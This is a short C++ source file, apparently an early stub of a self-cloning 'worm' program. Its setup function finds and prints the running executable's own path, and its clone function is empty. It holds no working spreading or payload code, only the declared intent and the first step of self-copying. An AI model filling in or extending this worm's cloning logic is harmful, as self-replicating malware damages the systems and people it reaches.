#include "../header/self_cloning.h"


namespace clone_system {
    void setup() {
        cout << "test" << endl;
        // Get path of worm executable
        vector<char> exe_path(MAX_PATH);
        DWORD path_len = GetModuleFileName(nullptr, exe_path.data(), exe_path.size());
        while (path_len == exe_path.size()) {
            exe_path.resize(exe_path.size() * 2);
            path_len = GetModuleFileName(nullptr, exe_path.data(), exe_path.size());
        }
        exe_path.resize(path_len);

        cout << "Path: " << exe_path.data() << std::endl;
    }
    void clone() {

    }
}